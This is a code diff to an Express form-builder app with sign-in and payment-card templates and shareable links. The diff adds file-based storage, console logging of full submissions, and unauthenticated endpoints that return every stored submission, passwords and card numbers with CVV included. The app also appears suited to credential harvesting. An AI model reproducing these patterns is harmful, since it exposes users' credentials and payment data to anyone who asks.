@@ -8,6 +8,63 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
+// Use persistent path for Render (set DATA_DIR=/data in Render env vars)
+const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
+const submissionsFile = path.join(DATA_DIR, 'submissions.json');
+const formConfigsFile = path.join(DATA_DIR, 'formConfigs.json');
+
+// Ensure data directory exists
+async function ensureDataDir() {
+  try {
+    await fs.mkdir(DATA_DIR, { recursive: true });
+    console.log(`Data directory ensured: ${DATA_DIR}`);
+  } catch (err) {
+    console.error('Error creating data directory:', err.message, err.stack);
+  }
+}
+
+// Initialize submissions file
+async function initializeSubmissionsFile() {
+  try {
+    await fs.access(submissionsFile);
+    console.log(`Submissions file exists: ${submissionsFile}`);
+  } catch {
+    await fs.writeFile(submissionsFile, JSON.stringify([]));
+    console.log('Created submissions.json');
+  }
+}
+
+// Initialize form configs file
+async function initializeFormConfigsFile() {
+  try {
+    await fs.access(formConfigsFile);
+    const data = await fs.readFile(formConfigsFile, 'utf8');
+    formConfigs = JSON.parse(data);
+    console.log('Loaded formConfigs from file');
+  } catch {
+    await fs.writeFile(formConfigsFile, JSON.stringify({}));
+    console.log('Created formConfigs.json');
+  }
+}
+
+// Save formConfigs to file
+async function saveFormConfigs() {
+  try {
+    await fs.writeFile(formConfigsFile, JSON.stringify(formConfigs, null, 2));
+    console.log('Saved formConfigs to file');
+  } catch (err) {
+    console.error('Error saving formConfigs:', err.message, err.stack);
+  }
+}
+
+// Initialize storage
+let formConfigs = {};
+(async () => {
+  await ensureDataDir();
+  await initializeSubmissionsFile();
+  await initializeFormConfigsFile();
+})();
+
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
@@ -15,22 +72,7 @@ app.use(express.static('public'));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 
-// In-memory storage for form configurations
-const formConfigs = {};
-// Path to submissions file
-const submissionsFile = path.join(__dirname, 'submissions.json');
-
-// Ensure submissions.json exists
-async function initializeSubmissionsFile() {
-  try {
-    await fs.access(submissionsFile);
-  } catch {
-    await fs.writeFile(submissionsFile, JSON.stringify([]));
-  }
-}
-initializeSubmissionsFile();
-
-// EJS template for live form
+// EJS template for live form (unchanged from your original)
 const formTemplate = `
 <!DOCTYPE html>
 <html lang="en">
@@ -442,7 +484,7 @@ function sanitizeForJs(str) {
 }
 
 // Route to save form configuration and generate shareable link
-app.post('/create', (req, res) => {
+app.post('/create', async (req, res) => {
   try {
     console.log('Received /create request:', req.body);
     const formId = generateShortCode();
@@ -477,6 +519,7 @@ app.post('/create', (req, res) => {
 
     formConfigs[formId] = config;
     console.log(`Stored form config for ${formId}:`, config);
+    await saveFormConfigs();
 
     const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
     const host = req.headers.host || `localhost:${port}`;
@@ -507,11 +550,13 @@ app.post('/form/:id/submit', async (req, res) => {
       )
     };
 
+    console.log(`Attempting to save submission for ${formId}:`, submission);
+
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
     submissions.push(submission);
     await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
 
-    console.log(`Submission saved for form ${formId}:`, submission);
+    console.log(`Submission saved successfully for form ${formId}`);
     res.status(200).json({ message: 'Submission saved successfully' });
   } catch (error) {
     console.error('Error saving submission:', error.message, error.stack);
@@ -519,7 +564,7 @@ app.post('/form/:id/submit', async (req, res) => {
   }
 });
 
-// Route to display submissions
+// Route to serve JSON for submissions (for submissions.html)
 app.get('/submissions', async (req, res) => {
   try {
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
@@ -528,15 +573,35 @@ app.get('/submissions', async (req, res) => {
       'contact': { name: 'Contact Form', fields: [{ id: 'phone' }, { id: 'email' }] },
       'payment-checkout': { name: 'Payment Checkout Form', fields: [{ id: 'card-number' }, { id: 'exp-date' }, { id: 'cvv' }] }
     };
+    console.log(`Retrieved ${submissions.length} submissions for /submissions`);
+    res.json({
+      submissions: submissions.reverse(),
+      templates
+    });
+  } catch (error) {
+    console.error('Error fetching submissions:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to fetch submissions', details: error.message });
+  }
+});
 
+// Optional: Admin view for server-rendered submissions
+app.get('/admin/submissions', async (req, res) => {
+  try {
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    const templates = {
+      'sign-in': { name: 'Sign In Form', fields: [{ id: 'email' }, { id: 'password' }] },
+      'contact': { name: 'Contact Form', fields: [{ id: 'phone' }, { id: 'email' }] },
+      'payment-checkout': { name: 'Payment Checkout Form', fields: [{ id: 'card-number' }, { id: 'exp-date' }, { id: 'cvv' }] }
+    };
+    console.log(`Rendering ${submissions.length} submissions for /admin/submissions`);
     res.render('submissions', {
-      submissions: submissions.reverse(), // Latest submissions first
+      submissions: submissions.reverse(),
       templates,
-      theme: 'light', // Default theme, can be made dynamic if needed
+      theme: 'light',
       sanitizeForJs
     });
   } catch (error) {
-    console.error('Error rendering submissions:', error.message, error.stack);
+    console.error('Error rendering admin submissions:', error.message, error.stack);
     res.status(500).send('Error rendering submissions');
   }
 });
